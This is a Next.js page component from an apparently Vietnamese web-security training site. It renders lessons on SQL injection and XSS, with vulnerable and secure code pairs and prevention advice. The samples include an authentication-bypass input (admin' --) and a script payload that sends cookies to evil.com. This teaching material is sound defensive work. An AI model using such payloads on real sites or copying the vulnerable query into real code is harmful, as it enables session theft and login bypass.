import Link from 'next/link';
import { vulnerabilities, labs } from '@/lib/data';
import { notFound } from 'next/navigation';
import { 
  BookOpen, 
  Settings, 
  Unlock, 
  Code, 
  AlertTriangle, 
  CheckCircle2, 
  ShieldAlert, 
  Check, 
  FlaskConical, 
  Clock, 
  Bookmark, 
  ChevronRight 
} from 'lucide-react';
import VulnIcon from '@/components/VulnIcon';

// Chi tiết nội dung cho mỗi vulnerability
const vulnDetails: Record<string, {
  overview: string;
  howItWorks: string;
  exploitation: string;
  codeExample: { language: string; vulnerable: string; secure: string };
  prevention: string[];
  references: string[];
}> = {
  'sql-injection': {
    overview: 'SQL Injection (SQLi) là một trong những lỗ hổng bảo mật nghiêm trọng và phổ biến nhất trong ứng dụng web. Lỗ hổng này xảy ra khi ứng dụng web chèn trực tiếp dữ liệu đầu vào của người dùng vào câu truy vấn SQL mà không kiểm tra hoặc lọc (sanitize) đúng cách.',
    howItWorks: 'Khi ứng dụng web xây dựng câu truy vấn SQL bằng cách nối chuỗi (string concatenation) với dữ liệu do người dùng cung cấp, kẻ tấn công có thể chèn thêm mã SQL độc hại vào câu truy vấn. Điều này cho phép kẻ tấn công:\n\n• Đọc dữ liệu nhạy cảm từ cơ sở dữ liệu\n• Sửa đổi hoặc xóa dữ liệu\n• Thực thi các thao tác quản trị trên cơ sở dữ liệu\n• Trong một số trường hợp, thực thi lệnh hệ điều hành',
    exploitation: 'Có nhiều loại SQL Injection:\n\n1. **In-band SQLi**: Kết quả truy vấn được hiển thị trực tiếp trên trang web\n   - UNION-based: Sử dụng UNION SELECT để trích xuất dữ liệu\n   - Error-based: Lợi dụng thông báo lỗi SQL để trích xuất thông tin\n\n2. **Blind SQLi**: Không hiển thị trực tiếp kết quả\n   - Boolean-based: Phân tích phản hồi TRUE/FALSE\n   - Time-based: Sử dụng SLEEP() để xác nhận điều kiện\n\n3. **Out-of-band SQLi**: Sử dụng kênh truyền thông khác (DNS, HTTP)',
    codeExample: {
      language: 'java',
      vulnerable: `// CODE LỖI - Dễ bị SQL Injection
String query = "SELECT * FROM users WHERE username = '" 
  + request.getParameter("username") 
  + "' AND password = '" 
  + request.getParameter("password") + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// Kẻ tấn công nhập: username = admin' --
// Query trở thành:
// SELECT * FROM users WHERE username = 'admin' --' AND password = ''
// Phần sau -- bị comment, bypass kiểm tra mật khẩu!`,
      secure: `// CODE AN TOÀN - Sử dụng Prepared Statement
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, request.getParameter("username"));
pstmt.setString(2, request.getParameter("password"));
ResultSet rs = pstmt.executeQuery();

// Prepared Statement tự động escape các ký tự đặc biệt
// Kẻ tấn công không thể thay đổi cấu trúc câu truy vấn`,
    },
    prevention: [
      'Sử dụng Prepared Statements (Parameterized Queries) cho TẤT CẢ truy vấn SQL',
      'Sử dụng ORM (Hibernate, JPA) thay vì viết SQL trực tiếp',
      'Áp dụng nguyên tắc Least Privilege cho database user',
      'Validate và sanitize tất cả input từ người dùng',
      'Sử dụng WAF (Web Application Firewall) để phát hiện SQLi patterns',
      'Không hiển thị lỗi SQL chi tiết cho người dùng cuối',
    ],
    references: [
      'OWASP SQL Injection Prevention Cheat Sheet',
      'CWE-89: SQL Injection',
      'PortSwigger Web Security Academy - SQL Injection',
    ],
  },
  'xss': {
    overview: 'Cross-Site Scripting (XSS) là lỗ hổng cho phép kẻ tấn công chèn mã JavaScript độc hại vào trang web mà người dùng khác sẽ nhìn thấy và trình duyệt sẽ thực thi. XSS cho phép kẻ tấn công đánh cắp session, cookie, hoặc thực hiện hành động thay mặt nạn nhân.',
    howItWorks: 'XSS xảy ra khi ứng dụng web hiển thị dữ liệu đầu vào của người dùng mà không encode hoặc escape đúng cách. Trình duyệt không phân biệt được đâu là mã JavaScript hợp lệ của trang web và đâu là mã độc hại do kẻ tấn công chèn vào.',
    exploitation: '1. **Reflected XSS**: Mã độc nằm trong URL/request và phản hồi lại ngay\n2. **Stored XSS**: Mã độc được lưu trong database và hiển thị cho mọi user\n3. **DOM-based XSS**: Mã độc được xử lý bởi JavaScript phía client',
    codeExample: {
      language: 'html',
      vulnerable: `<!-- CODE LỖI - Input không được escape -->
<div>
  Kết quả tìm kiếm cho: <%= request.getParameter("q") %>
</div>

<!-- Kẻ tấn công nhập: q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> -->
<!-- Trình duyệt sẽ thực thi script và gửi cookie đến server của kẻ tấn công -->`,
      secure: `<!-- CODE AN TOÀN - Sử dụng output encoding -->
<div>
  Kết quả tìm kiếm cho: \${fn:escapeXml(param.q)}
</div>

<!-- Hoặc trong React (tự động escape) -->
<div>Kết quả tìm kiếm cho: {searchQuery}</div>

<!-- React tự động escape HTML entities -->
<!-- <script> sẽ thành &lt;script&gt; và KHÔNG được thực thi -->`,
    },
    prevention: [
      'Output Encoding: Encode tất cả dữ liệu user trước khi render vào HTML',
      'Content Security Policy (CSP): Giới hạn nguồn script được phép thực thi',
      'HttpOnly cookie flag: Ngăn JavaScript truy cập session cookie',
      'Sử dụng framework hiện đại (React, Vue) tự động escape output',
      'Input validation: Whitelist các ký tự được phép',
      'Sanitize HTML input nếu cần cho phép rich text (dùng thư viện như DOMPurify)',
    ],
    references: [
      'OWASP XSS Prevention Cheat Sheet',
      'CWE-79: Cross-site Scripting',
      'PortSwigger - Cross-site scripting',
    ],
  },
};

// Fallback cho các vulnerability chưa có chi tiết
const defaultDetail = {
  overview: 'Nội dung chi tiết đang được cập nhật. Vui lòng quay lại sau.',
  howItWorks: 'Đang cập nhật...',
  exploitation: 'Đang cập nhật...',
  codeExample: { language: 'text', vulnerable: '// Đang cập nhật...', secure: '// Đang cập nhật...' },
  prevention: ['Đang cập nhật...'],
  references: ['Đang cập nhật...'],
};

export default async function VulnerabilityDetailPage({ params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;
  const vuln = vulnerabilities.find(v => v.slug === slug);

  if (!vuln) {
    notFound();
  }

  const detail = vulnDetails[slug] || defaultDetail;
  const relatedLabs = labs.filter(l => l.vulnerabilitySlug === slug);
  const severityClass = vuln.severity === 'CRITICAL' ? 'badge-critical' : 
                        vuln.severity === 'HIGH' ? 'badge-high' : 
                        vuln.severity === 'MEDIUM' ? 'badge-medium' : 'badge-low';

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: 'var(--space-4)', fontSize: '0.875rem' }}>
        <Link href="/vulnerabilities" style={{ color: 'var(--text-body-subtle)' }}>Lỗ hổng bảo mật</Link>
        <span style={{ color: 'var(--text-body-subtle)' }}>/</span>
        <span style={{ color: 'var(--text-heading)' }}>{vuln.name}</span>
      </div>

      {/* Header */}
      <div className="animate-fade-in-up" style={{ marginBottom: 'var(--space-6)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 'var(--space-3)' }}>
          <span style={{ display: 'inline-flex', alignItems: 'center', color: 'var(--fg-brand)' }}>
            <VulnIcon name={vuln.icon} size={40} />
          </span>
          <div>
            <h1 style={{ fontSize: '2rem', fontWeight: 800, margin: 0 }}>{vuln.name}</h1>
            <div style={{ display: 'flex', gap: 'var(--space-2)', marginTop: '4px' }}>
              <span className={`badge ${severityClass}`}>{vuln.severity}</span>
              <span style={{ fontSize: '0.875rem', color: 'var(--text-body-subtle)' }}>
                {vuln.labCount} bài lab thực hành
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Content Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: 'var(--space-4)' }}>
        {/* Main Content */}
        <div>
          {/* Overview */}
          <div className="card animate-fade-in-up animate-delay-1" style={{ marginBottom: 'var(--space-3)' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <BookOpen size={18} style={{ color: 'var(--fg-brand)' }} /> Tổng quan
            </h3>
            <p style={{ lineHeight: 1.8 }}>{detail.overview}</p>
          </div>

          {/* How it works */}
          <div className="card animate-fade-in-up animate-delay-2" style={{ marginBottom: 'var(--space-3)' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <Settings size={18} style={{ color: 'var(--fg-brand)' }} /> Cách hoạt động
            </h3>
            <p style={{ lineHeight: 1.8, whiteSpace: 'pre-line' }}>{detail.howItWorks}</p>
          </div>

          {/* Exploitation */}
          <div className="card animate-fade-in-up animate-delay-3" style={{ marginBottom: 'var(--space-3)' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <Unlock size={18} style={{ color: 'var(--fg-brand)' }} /> Khai thác
            </h3>
            <p style={{ lineHeight: 1.8, whiteSpace: 'pre-line' }}>{detail.exploitation}</p>
          </div>

          {/* Code Examples */}
          <div className="animate-fade-in-up animate-delay-4" style={{ marginBottom: 'var(--space-3)' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <Code size={18} style={{ color: 'var(--fg-brand)' }} /> Ví dụ Code
            </h3>
            
            {/* Vulnerable Code */}
            <div className="code-block" style={{ marginBottom: 'var(--space-2)' }}>
              <div className="code-block-header">
                <span className="code-block-lang" style={{ color: 'var(--fg-danger)', display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                  <AlertTriangle size={14} /> Code lỗ hổng - {detail.codeExample.language}
                </span>
              </div>
              <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
                {detail.codeExample.vulnerable}
              </pre>
            </div>

            {/* Secure Code */}
            <div className="code-block">
              <div className="code-block-header">
                <span className="code-block-lang" style={{ color: 'var(--fg-success-strong)', display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                  <CheckCircle2 size={14} /> Code an toàn - {detail.codeExample.language}
                </span>
              </div>
              <pre style={{ whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
                {detail.codeExample.secure}
              </pre>
            </div>
          </div>

          {/* Prevention */}
          <div className="card animate-fade-in-up animate-delay-5" style={{ marginBottom: 'var(--space-3)' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <ShieldAlert size={18} style={{ color: 'var(--fg-brand)' }} /> Cách phòng chống
            </h3>
            <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '12px', paddingLeft: 0 }}>
              {detail.prevention.map((item, i) => (
                <li key={i} style={{ display: 'flex', alignItems: 'flex-start', gap: '8px', color: 'var(--text-body)' }}>
                  <span style={{ color: 'var(--fg-success-strong)', flexShrink: 0, display: 'flex', alignItems: 'center', paddingTop: '3px' }}>
                    <Check size={14} />
                  </span>
                  <span>{item}</span>
                </li>
              ))}
            </ul>
          </div>
        </div>

        {/* Sidebar */}
        <div>
          {/* Related Labs */}
          <div className="card animate-fade-in-up animate-delay-2" style={{ marginBottom: 'var(--space-3)', position: 'sticky', top: 'calc(var(--header-height) + var(--space-3))' }}>
            <h3 style={{ marginBottom: 'var(--space-2)', fontSize: '1.125rem', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <FlaskConical size={18} style={{ color: 'var(--fg-brand)' }} /> Bài Lab thực hành
            </h3>
            {relatedLabs.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 'var(--space-1)' }}>
                {relatedLabs.map((lab) => {
                  const diffClass = lab.difficulty === 'EASY' ? 'badge-easy' : 
                                    lab.difficulty === 'MEDIUM' ? 'badge-medium-diff' : 
                                    lab.difficulty === 'HARD' ? 'badge-hard' : 'badge-expert';
                  return (
                    <Link key={lab.id} href={`/labs/${lab.id}`} style={{ textDecoration: 'none' }}>
                      <div style={{
                        padding: 'var(--space-2)',
                        background: 'var(--bg-neutral-tertiary)',
                        borderRadius: 'var(--radius-base)',
                        border: '1px solid var(--border-default)',
                        transition: 'all var(--transition-fast)',
                        cursor: 'pointer',
                      }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                          <span className={`badge ${diffClass}`} style={{ fontSize: '0.6875rem' }}>{lab.difficulty}</span>
                          <span style={{ fontSize: '0.75rem', color: 'var(--text-body-subtle)' }}>{lab.points} pts</span>
                        </div>
                        <div style={{ fontSize: '0.875rem', fontWeight: 600, color: 'var(--text-heading)' }}>{lab.title}</div>
                        <div style={{ fontSize: '0.75rem', color: 'var(--text-body-subtle)', marginTop: '4px', display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                          <Clock size={12} /> {lab.estimatedMinutes} phút
                        </div>
                      </div>
                    </Link>
                  );
                })}
              </div>
            ) : (
              <p style={{ fontSize: '0.875rem', color: 'var(--text-body-subtle)' }}>
                Chưa có bài lab cho lỗ hổng này.
              </p>
            )}
          </div>

          {/* References */}
          <div className="card animate-fade-in-up animate-delay-3">
            <h3 style={{ marginBottom: 'var(--space-2)', fontSize: '1.125rem', display: 'inline-flex', alignItems: 'center', gap: '8px' }}>
              <Bookmark size={18} style={{ color: 'var(--fg-brand)' }} /> Tham khảo
            </h3>
            <ul style={{ listStyle: 'none', display: 'flex', flexDirection: 'column', gap: '8px', paddingLeft: 0 }}>
              {detail.references.map((ref, i) => (
                <li key={i} style={{ fontSize: '0.8125rem', color: 'var(--fg-brand)', display: 'flex', alignItems: 'center', gap: '4px' }}>
                  <ChevronRight size={12} /> {ref}
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}
